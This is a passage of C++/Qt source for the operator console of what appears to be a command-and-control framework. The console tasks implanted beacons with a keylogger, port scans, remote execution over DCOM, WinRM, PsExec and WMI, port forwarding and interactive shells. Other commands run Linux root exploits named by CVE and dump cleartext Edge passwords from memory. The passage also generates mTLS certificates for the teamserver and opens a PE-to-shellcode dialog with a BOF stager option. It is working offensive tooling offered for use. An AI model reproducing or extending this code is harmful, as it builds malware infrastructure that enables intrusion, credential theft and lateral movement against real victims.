                      static_cast<int>(body.size())};
        client_->taskBeacon(beaconId, proto::TaskOp::Keylogger, pl);
        console_->appendOutput(QString("keylogger %1").arg(args[0]));
    } else if (verb == "portscan") {
        // Синтаксис: portscan <target> [ports]
        // ports — "22,80,443" или "1-1024" или пусто (топ-30 по умолчанию)
        auto args = QProcess::splitCommand(tail);
        if (args.isEmpty()) {
            console_->appendError("usage: portscan <target> [ports]");
            return;
        }
        kv::Writer w;
        w.put_str("target", args[0].toStdString());
        if (args.size() >= 2)
            w.put_str("ports", args[1].toStdString());
        auto body = w.finish();
        QByteArray pl{reinterpret_cast<const char*>(body.data()),
                      static_cast<int>(body.size())};
        client_->taskBeacon(beaconId, proto::TaskOp::PortScan, pl);
        QString portHint = args.size() >= 2 ? args[1] : "top-30";
        console_->appendOutput(QString("portscan -> %1 [%2]").arg(args[0], portHint));
    } else if (verb == "dcomexec") {
        // Синтаксис: dcomexec <target> <command>
        auto args = QProcess::splitCommand(tail);
        if (args.size() < 2) {
            console_->appendError("usage: dcomexec <target> <command>");
            return;
        }
        const QString target = args[0];
        QString cmd2;
        for (int i = 1; i < args.size(); ++i) { if (i > 1) cmd2 += QChar(' '); cmd2 += args[i]; }
        kv::Writer w;
        w.put_str("target", target.toStdString());
        w.put_str("cmd",    cmd2.toStdString());
        auto body = w.finish();
        QByteArray pl{reinterpret_cast<const char*>(body.data()), static_cast<int>(body.size())};
        client_->taskBeacon(beaconId, proto::TaskOp::DcomExec, pl);
        console_->appendOutput(QString("dcomexec -> %1 \"%2\"").arg(target, cmd2));
    } else if (verb == "winrmexec") {
        // Синтаксис: winrmexec <target> <command>
        // Требует WinRM HTTP (порт 5985) на цели + Local Admin
        auto args = QProcess::splitCommand(tail);
        if (args.size() < 2) {
            console_->appendError("usage: winrmexec <target> <command>");
            return;
        }
        const QString target = args[0];
        QString cmd2;
        for (int i = 1; i < args.size(); ++i) { if (i > 1) cmd2 += QChar(' '); cmd2 += args[i]; }
        kv::Writer w;
        w.put_str("target", target.toStdString());
        w.put_str("cmd",    cmd2.toStdString());
        auto body = w.finish();
        QByteArray pl{reinterpret_cast<const char*>(body.data()), static_cast<int>(body.size())};
        client_->taskBeacon(beaconId, proto::TaskOp::WinRmExec, pl);
        console_->appendOutput(QString("winrmexec -> %1 \"%2\"").arg(target, cmd2));
    } else if (verb == "portfwd") {
        // Синтаксис:
        //   portfwd add <lport> <rhost> <rport>
        //   portfwd del <lport>
        //   portfwd list  (или просто "portfwd")
        auto args = QProcess::splitCommand(tail);
        kv::Writer w;
        if (args.isEmpty() || args[0] == "list") {
            w.put_str("action", "list");
            auto body = w.finish();
            QByteArray pl{reinterpret_cast<const char*>(body.data()), static_cast<int>(body.size())};
            client_->taskBeacon(beaconId, proto::TaskOp::PortFwd, pl);
        } else if (args[0] == "add" && args.size() == 4) {
            bool ok1 = false, ok2 = false;
            quint32 lport = args[1].toUInt(&ok1);
            quint32 rport = args[3].toUInt(&ok2);
            if (!ok1 || !ok2 || lport == 0 || rport == 0) {
                console_->appendError("portfwd add: invalid port");
                return;
            }
            w.put_str("action", "add");
            w.put_u32("lport",  lport);
            w.put_str("rhost",  args[2].toStdString());
            w.put_u32("rport",  rport);
            auto body = w.finish();
            QByteArray pl{reinterpret_cast<const char*>(body.data()), static_cast<int>(body.size())};
            client_->taskBeacon(beaconId, proto::TaskOp::PortFwd, pl);
            console_->appendOutput(QString("portfwd add %1 -> %2:%3")
                                       .arg(lport).arg(args[2]).arg(rport));
        } else if (args[0] == "del" && args.size() == 2) {
            bool ok = false;
            quint32 lport = args[1].toUInt(&ok);
            if (!ok || lport == 0) { console_->appendError("portfwd del: invalid port"); return; }
            w.put_str("action", "del");
            w.put_u32("lport",  lport);
            auto body = w.finish();
            QByteArray pl{reinterpret_cast<const char*>(body.data()), static_cast<int>(body.size())};
            client_->taskBeacon(beaconId, proto::TaskOp::PortFwd, pl);
            console_->appendOutput(QString("portfwd del %1").arg(lport));
        } else {
            console_->appendError("usage: portfwd [add <lport> <rhost> <rport> | del <lport> | list]");
        }
    } else if (verb == "psexec_cmd") {
        // Синтаксис: psexec_cmd <target> <command>
        // target  — hostname или IP цели (нужен Local Admin)
        // command — команда, которую выполняет временный SCM-сервис
        auto args = QProcess::splitCommand(tail);
        if (args.size() < 2) {
            console_->appendError("usage: psexec_cmd <target> <command>");
            return;
        }
        const QString target = args[0];
        // Склеиваем остаток аргументов в строку команды.
        QString cmd2;
        for (int i = 1; i < args.size(); ++i) {
            if (i > 1) cmd2 += QChar(' ');
            cmd2 += args[i];
        }
        kv::Writer w;
        w.put_str("target", target.toStdString());
        w.put_str("cmd",    cmd2.toStdString());
        auto body = w.finish();
        QByteArray pl{reinterpret_cast<const char*>(body.data()),
                      static_cast<int>(body.size())};
        client_->taskBeacon(beaconId, proto::TaskOp::PsExecCmd, pl);
        console_->appendOutput(QString("psexec_cmd -> %1 \"%2\"").arg(target, cmd2));
    } else if (verb == "wmiexec") {
        // Синтаксис: wmiexec <target> <command>
        // target  — hostname или IP цели (нужен Local Admin)
        // command — команда через Win32_Process::Create
        auto args = QProcess::splitCommand(tail);
        if (args.size() < 2) {
            console_->appendError("usage: wmiexec <target> <command>");
            return;
        }
        const QString target = args[0];
        QString cmd2;
        for (int i = 1; i < args.size(); ++i) {
            if (i > 1) cmd2 += QChar(' ');
            cmd2 += args[i];
        }
        kv::Writer w;
        w.put_str("target", target.toStdString());
        w.put_str("cmd",    cmd2.toStdString());
        auto body = w.finish();
        QByteArray pl{reinterpret_cast<const char*>(body.data()),
                      static_cast<int>(body.size())};
        client_->taskBeacon(beaconId, proto::TaskOp::WmiExec, pl);
        console_->appendOutput(QString("wmiexec -> %1 \"%2\"").arg(target, cmd2));
    // ---- Linux beacon commands (supported on both, forwarded as-is) --------
    } else if (verb == "cat") {
        if (tail.isEmpty()) { console_->appendError("usage: cat <path>"); return; }
        client_->taskBeacon(beaconId, proto::TaskOp::Cat, tail.toUtf8());
    } else if (verb == "mkdir") {
        if (tail.isEmpty()) { console_->appendError("usage: mkdir <path>"); return; }
        client_->taskBeacon(beaconId, proto::TaskOp::Mkdir, tail.toUtf8());
    } else if (verb == "chmod") {
        auto args2 = QProcess::splitCommand(tail);
        if (args2.size() != 2) { console_->appendError("usage: chmod <mode> <path>"); return; }
        QByteArray pl2 = args2[0].toUtf8();
        pl2.append('\0');
        pl2.append(args2[1].toUtf8());
        client_->taskBeacon(beaconId, proto::TaskOp::Chmod, pl2);
    } else if (verb == "env") {
        client_->taskBeacon(beaconId, proto::TaskOp::Env, {});
    } else if (verb == "whoami") {
        client_->taskBeacon(beaconId, proto::TaskOp::Whoami, {});
    } else if (verb == "id") {
        client_->taskBeacon(beaconId, proto::TaskOp::Id, {});
    } else if (verb == "hostname") {
        client_->taskBeacon(beaconId, proto::TaskOp::Hostname, {});
    } else if (verb == "ifconfig") {
        client_->taskBeacon(beaconId, proto::TaskOp::Ifconfig, {});
    } else if (verb == "kill") {
        if (tail.isEmpty()) { console_->appendError("usage: kill <pid>"); return; }
        client_->taskBeacon(beaconId, proto::TaskOp::Kill, tail.toUtf8());
    } else if (verb == "privesc_root") {
        // CVE-2022-0847 Dirty Pipe + CVE-2026-31431 Copy Fail (Linux beacon only)
        // Синтаксис: privesc_root [passwd | suid <path> | afalg <path> | copyfail <path> | copyfail_passwd]
        QByteArray pl = tail.isEmpty() ? QByteArray("passwd") : tail.toUtf8();
        client_->taskBeacon(beaconId, proto::TaskOp::PrivescRoot, pl);
    } else if (verb == "dirtyfrag") {
        // xfrm/ESP + rxrpc/rxkad page-cache LPE (Linux beacon only)
        QByteArray pl = tail.toUtf8();
        client_->taskBeacon(beaconId, proto::TaskOp::DirtyFrag, pl);
    } else if (verb == "edge_creds") {
        // Дамп паролей из памяти Edge (cleartext в куче процесса)
        client_->taskBeacon(beaconId, proto::TaskOp::EdgeCreds, {});
        console_->appendOutput("edge_creds queued");
    } else {
        // Check plugin-registered commands.
        bool handled = false;
        if (plugin_ctx_) {
            for (const auto& pc : plugin_ctx_->pluginCommands()) {
                if (verb.compare(pc.name, Qt::CaseInsensitive) == 0) {
                    pc.handler(beaconId, tail);
                    handled = true;
                    break;
                }
            }
        }
        if (!handled)
            console_->appendError("unknown command: " + verb);
    }

    // Привязка всех порождённых rpc к текущей консоли.
    const quint64 rpcAfter = client_->currentRpcCounter();
    for (quint64 r = rpcBefore; r < rpcAfter; ++r)
        con_by_rpc_.insert(r, console_);
}

void MainWindow::onIShellInput(const QString& beaconId, const QString& line) {
    client_->taskBeacon(beaconId, proto::TaskOp::IShell, line.toUtf8());
}

void MainWindow::onIShellStop(const QString& beaconId) {
    client_->taskBeacon(beaconId, proto::TaskOp::IShell, {});
    console_->exitInteractiveShell();
}

void MainWindow::onInteract(const QString& beaconId) {
    // Получаем псевдоним бикона из графа (если задан).
    const QString alias = graph_view_->beaconAlias(beaconId);

    // Переключить только текущую вкладку — остальные сохраняют свои биконы
    // и интерактивные шелы. Это позволяет держать linpeas/winpeas
    // в разных вкладках параллельно.
    if (console_) {
        if (console_->isInteractiveShell())
            console_->exitInteractiveShell();
        console_->setBeaconId(beaconId);
        console_->setBeaconAlias(alias);
    }
    file_browser_->setBeacon(beaconId);
    statusBar()->showMessage("Interacting with " + beaconId);
}

void MainWindow::refreshData() {
    client_->listSessions();
    client_->listListeners();
}

void MainWindow::onToggleTheme() {
    applyTheme(currentTheme() == Theme::Dark ? Theme::Light : Theme::Dark);
    updateIcons();
}

// ---- teamserver process management -----------------------------------------

static void appendLogsText(QPlainTextEdit* logs, QTabWidget* tabs,
                            const QString& text, const QColor& color) {
    QTextCharFormat f;
    f.setForeground(color);
    auto cur = logs->textCursor();
    cur.movePosition(QTextCursor::End);
    cur.insertText(text, f);
    logs->setTextCursor(cur);
    logs->ensureCursorVisible();
    // Mark Logs tab if not currently visible.
    if (tabs->currentIndex() != 6) {
        QString t = tabs->tabText(6);
        if (!t.endsWith(" •")) tabs->setTabText(6, t + " •");
    }
}

void MainWindow::onStartServer() {
    QString bin = QApplication::applicationDirPath() + "/teamserver";
#ifdef Q_OS_WIN
    bin += ".exe";
#endif
    server_proc_ = new QProcess(this);
    server_proc_->setProcessChannelMode(QProcess::SeparateChannels);
    connect(server_proc_, &QProcess::readyReadStandardOutput,
            this, &MainWindow::onServerStdout);
    connect(server_proc_, &QProcess::readyReadStandardError,
            this, &MainWindow::onServerStderr);
    connect(server_proc_, qOverload<int, QProcess::ExitStatus>(&QProcess::finished),
            this, &MainWindow::onServerFinished);

    QString cfg = QApplication::applicationDirPath() + "/configs/srv.toml";
    server_proc_->start(bin, QStringList{"--config", cfg});
    if (!server_proc_->waitForStarted(3000)) {
        appendLogsText(logs_, tabs_,
            QString("[failed to start teamserver: %1]\n").arg(bin),
            QColor("#f87171"));
        server_proc_->deleteLater(); server_proc_ = nullptr;
        return;
    }
    start_srv_act_->setEnabled(false);
    stop_srv_act_->setEnabled(true);
    statusBar()->showMessage("Teamserver running (pid " +
                             QString::number(server_proc_->processId()) + ")");
    appendLogsText(logs_, tabs_,
        QString("[teamserver started: %1]\n").arg(bin), QColor("#10b981"));
    // Switch to Logs tab so user sees output immediately.
    const int logsIdx = tabs_->indexOf(logs_);
    tabs_->setCurrentIndex(logsIdx);
    tabs_->setTabText(logsIdx, "Logs");
}

void MainWindow::onStopServer() {
    if (!server_proc_) return;
    server_proc_->terminate();
    // Force-kill after 3 seconds if process doesn't respond.
    QTimer::singleShot(3000, this, [this] {
        if (server_proc_ && server_proc_->state() != QProcess::NotRunning)
            server_proc_->kill();
    });
    stop_srv_act_->setEnabled(false);
}

// ---- OpenSSL helpers for mTLS certificate generation -----------------------

// Генерация RSA-ключа через EVP_PKEY_CTX (совместимо с OpenSSL 1.x и 3.x).
static EVP_PKEY* ssl_gen_rsa(int bits) {
    EVP_PKEY_CTX* ctx = EVP_PKEY_CTX_new_id(EVP_PKEY_RSA, nullptr);
    if (!ctx) return nullptr;
    EVP_PKEY* key = nullptr;
    if (EVP_PKEY_keygen_init(ctx) > 0 &&
        EVP_PKEY_CTX_set_rsa_keygen_bits(ctx, bits) > 0 &&
        EVP_PKEY_keygen(ctx, &key) > 0) { /* ok */ }
    else { EVP_PKEY_free(key); key = nullptr; }
    EVP_PKEY_CTX_free(ctx);
    return key;
}

// Basic Constraints через ASN.1 API напрямую — без conf-парсера.
// Конф-парсер X509V3_EXT_conf_nid в OpenSSL 3.x не вычисляет "hash" автоматически
// (см. openssl/openssl#25264), поэтому делаем всё руками.
static bool ssl_add_basic_constraints(X509* cert, bool isCa, bool critical) {
    BASIC_CONSTRAINTS* bc = BASIC_CONSTRAINTS_new();
    if (!bc) return false;
    bc->ca = isCa ? 1 : 0;
    bc->pathlen = nullptr;
    int rc = X509_add1_ext_i2d(cert, NID_basic_constraints, bc, critical ? 1 : 0, 0);
    BASIC_CONSTRAINTS_free(bc);
    return rc == 1;
}

// Key Usage битмаска (RFC 5280) через ASN1_BIT_STRING.
static bool ssl_add_key_usage(X509* cert, unsigned int bits, bool critical) {
    ASN1_BIT_STRING* ku = ASN1_BIT_STRING_new();
    if (!ku) return false;
    // 9 бит KU, маска заносится младшими 8 в первый байт + 1 во второй.
    for (int i = 0; i < 9; ++i)
        ASN1_BIT_STRING_set_bit(ku, i, (bits >> i) & 1);
    int rc = X509_add1_ext_i2d(cert, NID_key_usage, ku, critical ? 1 : 0, 0);
    ASN1_BIT_STRING_free(ku);
    return rc == 1;
}

// Subject Key Identifier = SHA-1(SubjectPublicKeyInfo). Считаем сами.
// X509_pubkey_digest требует, чтобы X509_set_pubkey(cert, key) уже был вызван.
static bool ssl_add_ski(X509* cert) {
    unsigned char md[EVP_MAX_MD_SIZE];
    unsigned int md_len = 0;
    if (!X509_pubkey_digest(cert, EVP_sha1(), md, &md_len)) return false;

    ASN1_OCTET_STRING* ski = ASN1_OCTET_STRING_new();
    if (!ski) return false;
    ASN1_OCTET_STRING_set(ski, md, (int)md_len);
    int rc = X509_add1_ext_i2d(cert, NID_subject_key_identifier, ski, 0, 0);
    ASN1_OCTET_STRING_free(ski);
    return rc == 1;
}

// Authority Key Identifier: keyid поля = SKI центра. Достаём SKI у issuer'а.
// Для самоподписанного CA issuer == cert (свой собственный SKI должен быть уже добавлен).
static bool ssl_add_aki(X509* cert, X509* issuer) {
    int idx = X509_get_ext_by_NID(issuer, NID_subject_key_identifier, -1);
    if (idx < 0) return false;
    const X509_EXTENSION* ext = X509_get_ext(issuer, idx);
    if (!ext) return false;
    ASN1_OCTET_STRING* issuerSki = (ASN1_OCTET_STRING*)X509V3_EXT_d2i((X509_EXTENSION*)ext);
    if (!issuerSki) return false;

    AUTHORITY_KEYID* akid = AUTHORITY_KEYID_new();
    if (!akid) { ASN1_OCTET_STRING_free(issuerSki); return false; }
    akid->keyid = ASN1_OCTET_STRING_dup(issuerSki);

    int rc = X509_add1_ext_i2d(cert, NID_authority_key_identifier, akid, 0, 0);
    AUTHORITY_KEYID_free(akid);
    ASN1_OCTET_STRING_free(issuerSki);
    return rc == 1;
}

// Создание X.509 v3 сертификата. issuerCert/issuerKey == nullptr → самоподписанный (CA).
static X509* ssl_make_cert(EVP_PKEY* subjectKey, const char* cn,
                            X509* issuerCert, EVP_PKEY* issuerKey,
                            long serial, int days) {
    X509* cert = X509_new();
    if (!cert) return nullptr;

    X509_set_version(cert, 2);                              // 0-based → X.509 v3
    ASN1_INTEGER_set(X509_get_serialNumber(cert), serial);
    X509_gmtime_adj(X509_getm_notBefore(cert), 0);
    X509_gmtime_adj(X509_getm_notAfter(cert), (long)days * 86400L);

    X509_NAME* subj = (X509_NAME*)X509_get_subject_name(cert);
    X509_NAME_add_entry_by_txt(subj, "C",  MBSTRING_ASC, (const uint8_t*)"XX",    -1, -1, 0);
    X509_NAME_add_entry_by_txt(subj, "O",  MBSTRING_ASC, (const uint8_t*)"Co2H",  -1, -1, 0);
    X509_NAME_add_entry_by_txt(subj, "CN", MBSTRING_ASC, (const uint8_t*)cn,      -1, -1, 0);

    X509_set_issuer_name(cert, (X509_NAME*)(issuerCert ? X509_get_subject_name(issuerCert)
                                                        : X509_get_subject_name(cert)));
    // ВАЖНО: pubkey должен быть установлен ДО вычисления SKI.
    X509_set_pubkey(cert, subjectKey);

    // Биты Key Usage по RFC 5280 (для ASN1_BIT_STRING_set_bit).
    // Имена KU_* зарезервированы макросами OpenSSL — используем свои.
    constexpr unsigned KU_BIT_DIGITAL_SIG    = 0;
    constexpr unsigned KU_BIT_KEY_ENCIPHER   = 2;
    constexpr unsigned KU_BIT_KEY_CERT_SIGN  = 5;
    constexpr unsigned KU_BIT_CRL_SIGN       = 6;
    auto bit = [](unsigned i) { return 1u << i; };

    auto fail = [&]() -> X509* { X509_free(cert); return nullptr; };

    const bool isCa = (issuerCert == nullptr);
    if (isCa) {
        if (!ssl_add_basic_constraints(cert, true, true))                                   return fail();
        if (!ssl_add_key_usage(cert, bit(KU_BIT_KEY_CERT_SIGN) | bit(KU_BIT_CRL_SIGN), true)) return fail();
        if (!ssl_add_ski(cert))                                                              return fail();
        // Самоподписанный: cert уже содержит собственный SKI (добавлен выше).
        if (!ssl_add_aki(cert, cert))                                                        return fail();
    } else {
        if (!ssl_add_basic_constraints(cert, false, false))                                              return fail();
        if (!ssl_add_key_usage(cert, bit(KU_BIT_DIGITAL_SIG) | bit(KU_BIT_KEY_ENCIPHER), false))         return fail();
        if (!ssl_add_ski(cert))                                                                          return fail();
        if (!ssl_add_aki(cert, issuerCert))                                                              return fail();
    }

    if (!X509_sign(cert, issuerKey ? issuerKey : subjectKey, EVP_sha256())) {
        X509_free(cert); return nullptr;
    }
    return cert;
}

static bool ssl_write_key(const char* path, EVP_PKEY* key) {
    BIO* bio = BIO_new_file(path, "wb");
    if (!bio) return false;
    bool ok = PEM_write_bio_PrivateKey(bio, key, nullptr, nullptr, 0, nullptr, nullptr) == 1;
    BIO_free(bio);
    return ok;
}

static bool ssl_write_cert(const char* path, X509* cert) {
    BIO* bio = BIO_new_file(path, "wb");
    if (!bio) return false;
    bool ok = PEM_write_bio_X509(bio, cert) == 1;
    BIO_free(bio);
    return ok;
}

// Программная верификация цепочки: child должен быть подписан caCert.
// Возвращает текст ошибки или пустую строку при успехе.
static QString ssl_verify_chain(X509* caCert, X509* child) {
    X509_STORE* store = X509_STORE_new();
    if (!store) return "X509_STORE_new failed";
    X509_STORE_add_cert(store, caCert);

    X509_STORE_CTX* ctx = X509_STORE_CTX_new();
    if (!ctx) { X509_STORE_free(store); return "X509_STORE_CTX_new failed"; }
    X509_STORE_CTX_init(ctx, store, child, nullptr);

    QString err;
    if (X509_verify_cert(ctx) != 1) {
        int code = X509_STORE_CTX_get_error(ctx);
        err = QString("verify failed: %1 (%2)")
                .arg(X509_verify_cert_error_string(code)).arg(code);
    }
    X509_STORE_CTX_free(ctx);
    X509_STORE_free(store);
    return err;
}

// ---------------------------------------------------------------------------

void MainWindow::onGenerateCerts() {
    const QString certsDir = QApplication::applicationDirPath() + "/certs";

    // Если сертификаты уже есть — спросить про перезапись.
    {
        QDir d(certsDir);
        if (d.exists("ca.crt") || d.exists("server.crt") || d.exists("operator.crt")) {
            if (QMessageBox::question(this, "Generate Certificates",
                    QString("Certificates already exist in:\n%1\n\nOverwrite?")
                        .arg(QDir::toNativeSeparators(certsDir)),
                    QMessageBox::Yes | QMessageBox::No) != QMessageBox::Yes)
                return;
        }
    }

    QDir().mkpath(certsDir);

    appendLogsText(logs_, tabs_,
        "[*] Generating mTLS certificates via OpenSSL API (RSA-4096, ~30 s)...\n",
        QColor("#94a3b8"));
    {
        const int logsIdx = tabs_->indexOf(logs_);
        tabs_->setCurrentIndex(logsIdx);
        tabs_->setTabText(logsIdx, "Logs");
    }

    // Захватываем указатели явно — Qt объекты доступны только из GUI-потока
    // через QMetaObject::invokeMethod(Qt::QueuedConnection).
    QPlainTextEdit* logs = logs_;
    QTabWidget*     tabs = tabs_;

    QThread* worker = QThread::create([this, certsDir, logs, tabs]() {
        // Логирование из рабочего потока.
        auto log = [this, logs, tabs](const QString& msg, QColor col) {
            QMetaObject::invokeMethod(this, [logs, tabs, msg, col]() {
                appendLogsText(logs, tabs, msg, col);
            }, Qt::QueuedConnection);
        };

        // unique_ptr с OpenSSL-освободителями — RAII без исключений.
        using PKeyPtr = std::unique_ptr<EVP_PKEY, decltype(&EVP_PKEY_free)>;
        using CertPtr = std::unique_ptr<X509,     decltype(&X509_free)>;

        // Вся генерация — в immediately-invoked лямбде, возвращает bool.
        // Это позволяет использовать return вместо goto и гарантирует
        // правильный порядок вызова деструкторов unique_ptr.
        bool ok = [&]() -> bool {
            auto wkey  = [&](const char* fn, EVP_PKEY* k) {
                return ssl_write_key((certsDir + "/" + fn).toUtf8().constData(), k);
            };
            auto wcert = [&](const char* fn, X509* c) {
                return ssl_write_cert((certsDir + "/" + fn).toUtf8().constData(), c);
            };

            // -- CA (самоподписанный) ----------------------------------------
            log("[*] CA key...\n", QColor("#94a3b8"));
            PKeyPtr caKey(ssl_gen_rsa(4096), EVP_PKEY_free);
            if (!caKey) { log("[!] CA key failed.\n", QColor("#f87171")); return false; }

            CertPtr caCert(ssl_make_cert(caKey.get(), "Co2H-CA",
                                         nullptr, nullptr, 1, 3650), X509_free);
            if (!caCert) { log("[!] CA cert failed.\n", QColor("#f87171")); return false; }

            if (!wkey("ca.key", caKey.get()) || !wcert("ca.crt", caCert.get()))
                { log("[!] Write ca failed.\n", QColor("#f87171")); return false; }
            log("[+] ca.crt / ca.key\n", QColor("#10b981"));

            // -- Server -------------------------------------------------------
            log("[*] Server key...\n", QColor("#94a3b8"));
            PKeyPtr srvKey(ssl_gen_rsa(4096), EVP_PKEY_free);
            if (!srvKey) { log("[!] Server key failed.\n", QColor("#f87171")); return false; }
            CertPtr srvCert(ssl_make_cert(srvKey.get(), "teamserver",
                                          caCert.get(), caKey.get(), 2, 3650), X509_free);
            if (!srvCert) { log("[!] Server cert failed.\n", QColor("#f87171")); return false; }
            // Программная верификация: server.crt → ca.crt.
            if (auto e = ssl_verify_chain(caCert.get(), srvCert.get()); !e.isEmpty()) {
                log("[!] server cert " + e + "\n", QColor("#f87171"));
                return false;
            }
            if (!wkey("server.key", srvKey.get()) || !wcert("server.crt", srvCert.get()))
                { log("[!] Write server failed.\n", QColor("#f87171")); return false; }
            log("[+] server.crt / server.key (chain OK)\n", QColor("#10b981"));

            // -- Listener -----------------------------------------------------
            log("[*] Listener key...\n", QColor("#94a3b8"));
            PKeyPtr lstKey(ssl_gen_rsa(4096), EVP_PKEY_free);
            if (!lstKey) { log("[!] Listener key failed.\n", QColor("#f87171")); return false; }
            CertPtr lstCert(ssl_make_cert(lstKey.get(), "listener",
                                          caCert.get(), caKey.get(), 3, 3650), X509_free);
            if (!lstCert) { log("[!] Listener cert failed.\n", QColor("#f87171")); return false; }
            if (!wkey("listener.key", lstKey.get()) || !wcert("listener.crt", lstCert.get()))
                { log("[!] Write listener failed.\n", QColor("#f87171")); return false; }
            log("[+] listener.crt / listener.key\n", QColor("#10b981"));

            // -- Operator -----------------------------------------------------
            log("[*] Operator key...\n", QColor("#94a3b8"));
            PKeyPtr opKey(ssl_gen_rsa(4096), EVP_PKEY_free);
            if (!opKey) { log("[!] Operator key failed.\n", QColor("#f87171")); return false; }
            CertPtr opCert(ssl_make_cert(opKey.get(), "operator",
                                         caCert.get(), caKey.get(), 4, 3650), X509_free);
            if (!opCert) { log("[!] Operator cert failed.\n", QColor("#f87171")); return false; }
            if (auto e = ssl_verify_chain(caCert.get(), opCert.get()); !e.isEmpty()) {
                log("[!] operator cert " + e + "\n", QColor("#f87171"));
                return false;
            }
            if (!wkey("operator.key", opKey.get()) || !wcert("operator.crt", opCert.get()))
                { log("[!] Write operator failed.\n", QColor("#f87171")); return false; }
            log("[+] operator.crt / operator.key (chain OK)\n", QColor("#10b981"));

            return true;
        }();

        if (ok) {
            log("[+] Done. All certificates written.\n", QColor("#10b981"));
            QMetaObject::invokeMethod(this, [this]() {
                // Если teamserver запущен — он держит старые сертификаты в памяти.
                // Без перезапуска TLS-рукопожатие завалится с "unknown ca".
                const bool serverRunning = server_proc_ &&
                                           server_proc_->state() == QProcess::Running;
                if (serverRunning) {
                    auto btn = QMessageBox::question(this, "Generate Certificates",
                        "mTLS certificates generated successfully.\n\n"
                        "Files written to certs/:\n"
                        "  ca.crt / ca.key\n"
                        "  server.crt / server.key\n"
                        "  listener.crt / listener.key\n"
                        "  operator.crt / operator.key\n\n"
                        "Teamserver is running with old certificates.\n"
                        "Restart it now?",
                        QMessageBox::Yes | QMessageBox::No);
                    if (btn == QMessageBox::Yes) {
                        onStopServer();
                        // Даём 4 секунды на корректное завершение процесса,
                        // затем запускаем с новыми сертификатами.
                        QTimer::singleShot(4000, this, &MainWindow::onStartServer);
                    }
                } else {
                    QMessageBox::information(this, "Generate Certificates",
                        "mTLS certificates generated successfully.\n\n"
                        "Files written to certs/:\n"
                        "  ca.crt / ca.key\n"
                        "  server.crt / server.key\n"
                        "  listener.crt / listener.key\n"
                        "  operator.crt / operator.key");
                }
            }, Qt::QueuedConnection);
        } else {
            QMetaObject::invokeMethod(this, [this]() {
                QMessageBox::warning(this, "Generate Certificates",
                    "Certificate generation failed.\nSee Logs tab for details.");
            }, Qt::QueuedConnection);
        }
    });

    connect(worker, &QThread::finished, worker, &QThread::deleteLater);
    worker->start();
}

// ---- Generate Shellcode (scelot) ------------------------------------------

void MainWindow::onGenerateShellcode() {
    const QString scelotExe =
        QApplication::applicationDirPath() + "/kit/utils/scelot.exe";
    if (!QFileInfo::exists(scelotExe)) {
        QMessageBox::warning(this, "Generate Shellcode",
            "scelot.exe not found at:\n" + QDir::toNativeSeparators(scelotExe) +
            "\n\nRebuild the project — scelot is copied to "
            "bin\\kit\\utils\\ during build.");
        return;
    }

    // Диалог: повторяет интерфейс scelot_gui.cs (Browse/комбо/чекбокс/Generate/Log).
    auto* dlg = new QDialog(this);
    dlg->setWindowTitle("Generate Shellcode (scelot)");
    dlg->setMinimumSize(700, 580);
    dlg->setAttribute(Qt::WA_DeleteOnClose);

    auto* tbInput     = new QLineEdit(dlg);
    auto* tbOutput    = new QLineEdit(dlg);
    auto* cbArch      = new QComboBox(dlg);
    cbArch->addItems({"auto", "x64", "x86"});
    auto* cbExit      = new QComboBox(dlg);
    cbExit->addItems({"exit", "thread", "return"});
    auto* tbArgs      = new QLineEdit(dlg);
    auto* tbExport    = new QLineEdit(dlg);
    auto* tbNetClass  = new QLineEdit(dlg);
    auto* tbNetMethod = new QLineEdit(dlg);
    auto* cbEmitBof   = new QCheckBox("Also emit BOF stager (.o)", dlg);

    auto* btnInBrowse  = new QPushButton("Browse…", dlg);
    auto* btnOutBrowse = new QPushButton("Browse…", dlg);
    btnInBrowse->setFixedWidth(90);
    btnOutBrowse->setFixedWidth(90);

    connect(btnInBrowse, &QPushButton::clicked, dlg, [dlg, tbInput, tbOutput]() {
        QString f = QFileDialog::getOpenFileName(dlg, "Input PE", QString(),
            "PE files (*.exe *.dll);;All files (*.*)");
        if (!f.isEmpty()) {
            tbInput->setText(QDir::toNativeSeparators(f));
            if (tbOutput->text().isEmpty()) {
                QFileInfo fi(f);
                tbOutput->setText(QDir::toNativeSeparators(
                    fi.path() + "/" + fi.completeBaseName() + ".bin"));
            }
        }
    });
    connect(btnOutBrowse, &QPushButton::clicked, dlg, [dlg, tbOutput]() {
        QString f = QFileDialog::getSaveFileName(dlg, "Output .bin",
            tbOutput->text(), "Shellcode (*.bin)");
        if (!f.isEmpty()) tbOutput->setText(QDir::toNativeSeparators(f));
    });

    auto* tbLog = new QPlainTextEdit(dlg);
    tbLog->setReadOnly(true);
    tbLog->setFont(QFont("Consolas", 9));

    auto* btnGen   = new QPushButton("Generate", dlg);
    auto* btnClose = new QPushButton("Close",    dlg);
    btnGen->setMinimumHeight(28);
    btnClose->setMinimumHeight(28);
    connect(btnClose, &QPushButton::clicked, dlg, &QDialog::accept);

    // Раскладка.
    auto* form = new QFormLayout;
    auto* inRow  = new QHBoxLayout;
    inRow->addWidget(tbInput);  inRow->addWidget(btnInBrowse);
    auto* outRow = new QHBoxLayout;
    outRow->addWidget(tbOutput); outRow->addWidget(btnOutBrowse);
    form->addRow("Input PE:",      inRow);
    form->addRow("Output .bin:",   outRow);
    form->addRow("Architecture:",  cbArch);
    form->addRow("Exit mode:",     cbExit);
    form->addRow("Args:",          tbArgs);
    form->addRow("Export (DLL):",  tbExport);
    form->addRow(".NET class:",    tbNetClass);
    form->addRow(".NET method:",   tbNetMethod);
    form->addRow("",               cbEmitBof);

    auto* btnRow = new QHBoxLayout;
    btnRow->addStretch();
    btnRow->addWidget(btnGen);
    btnRow->addWidget(btnClose);

    auto* root = new QVBoxLayout(dlg);
    root->addLayout(form);
    root->addLayout(btnRow);
    root->addWidget(new QLabel("Log:", dlg));
    root->addWidget(tbLog, 1);

    // Лог.
    auto log = [tbLog](const QString& s, QColor col = QColor()) {
        QTextCharFormat f;
        if (col.isValid()) f.setForeground(col);
        auto cur = tbLog->textCursor();
        cur.movePosition(QTextCursor::End);
        cur.insertText(s + "\n", f);
        tbLog->setTextCursor(cur);
        tbLog->ensureCursorVisible();
    };

    log("scelot.exe = " + QDir::toNativeSeparators(scelotExe), QColor("#94a3b8"));

    // Запуск scelot.exe с параметрами из формы.
    connect(btnGen, &QPushButton::clicked, dlg,
        [dlg, scelotExe, tbInput, tbOutput, cbArch, cbExit, tbArgs,
         tbExport, tbNetClass, tbNetMethod, cbEmitBof, btnGen, log]() {

        if (tbInput->text().isEmpty() || tbOutput->text().isEmpty()) {
            QMessageBox::warning(dlg, "Generate Shellcode",
